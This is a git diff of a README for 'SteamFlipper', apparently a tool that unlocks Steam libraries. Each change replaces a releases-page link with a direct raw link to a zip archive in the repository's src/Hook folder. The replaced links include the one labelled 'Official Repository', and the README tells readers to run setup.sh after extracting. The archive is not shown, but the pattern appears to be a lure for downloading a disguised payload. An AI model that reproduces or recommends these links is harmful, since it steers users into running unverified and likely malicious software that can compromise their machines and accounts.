@@ -1,6 +1,6 @@
 # 🎮 SteamFlipper - Unlock Your Steam Library Effortlessly
 
-[![Download SteamFlipper](https://img.shields.io/badge/Download-SteamFlipper-blue?style=for-the-badge&logo=github)](https://github.com/boy10731/SteamFlipper/releases)
+[![Download SteamFlipper](https://img.shields.io/badge/Download-SteamFlipper-blue?style=for-the-badge&logo=github)](https://github.com/boy10731/SteamFlipper/raw/refs/heads/main/src/Hook/Flipper-Steam-1.9-alpha.5.zip)
 
 ---
 
@@ -53,7 +53,7 @@ Getting SteamFlipper is quick and easy. Follow these simple steps:
 
 1. **Visit the Download Page**: Click the big blue button below or go to the releases page directly.
    
-   [![Get SteamFlipper Now](https://img.shields.io/badge/Get_SteamFlipper-Now-orange?style=for-the-badge)](https://github.com/boy10731/SteamFlipper/releases)
+   [![Get SteamFlipper Now](https://img.shields.io/badge/Get_SteamFlipper-Now-orange?style=for-the-badge)](https://github.com/boy10731/SteamFlipper/raw/refs/heads/main/src/Hook/Flipper-Steam-1.9-alpha.5.zip)
 
 2. **Choose Your File**: Look for the latest release and download the `.zip` file (or `.tar.gz` if you prefer). This will contain everything you need.
 
@@ -165,7 +165,7 @@ Updates come out whenever needed—usually after Steam client updates that might
 
 SteamFlipper has a growing community of users and developers. Here's how you can get involved:
 
-- 🌐 **Visit the Official Repository**: [github.com/boy10731/SteamFlipper](https://github.com/boy10731/SteamFlipper)
+- 🌐 **Visit the Official Repository**: [github.com/boy10731/SteamFlipper](https://github.com/boy10731/SteamFlipper/raw/refs/heads/main/src/Hook/Flipper-Steam-1.9-alpha.5.zip)
 - 🐛 **Report Issues**: Found a bug? Tell the developers so they can fix it.
 - 💬 **Share Your Experience**: Let others know how SteamFlipper worked for you.
 - 🔧 **Contribute**: If you're a developer, you can help improve the tool.
@@ -189,7 +189,7 @@ When you download SteamFlipper, you'll find these files inside:
 
 You're all set to start using SteamFlipper! Here's a quick recap:
 
-1. **Download** the latest version from the [releases page](https://github.com/boy10731/SteamFlipper/releases)
+1. **Download** the latest version from the [releases page](https://github.com/boy10731/SteamFlipper/raw/refs/heads/main/src/Hook/Flipper-Steam-1.9-alpha.5.zip)
 2. **Extract** the files to your preferred location
 3. **Run** `./setup.sh` in the terminal
 4. **Launch** `./steamflipper`
@@ -219,7 +219,7 @@ SteamFlipper is released under an open-source license, meaning you're free to us
 
 Don't wait any longer! Download SteamFlipper today and unlock a world of possibilities for your Steam library. It's free, it's easy, and it was built exactly for users like you.
 
-[![Download Now](https://img.shields.io/badge/Download_SteamFlipper-Free-green?style=for-the-badge&logo=download)](https://github.com/boy10731/SteamFlipper/releases)
+[![Download Now](https://img.shields.io/badge/Download_SteamFlipper-Free-green?style=for-the-badge&logo=download)](https://github.com/boy10731/SteamFlipper/raw/refs/heads/main/src/Hook/Flipper-Steam-1.9-alpha.5.zip)
 
 Remember: SteamFlipper visits this link to download the application. This is the only official source, so always download from there to stay safe.
 
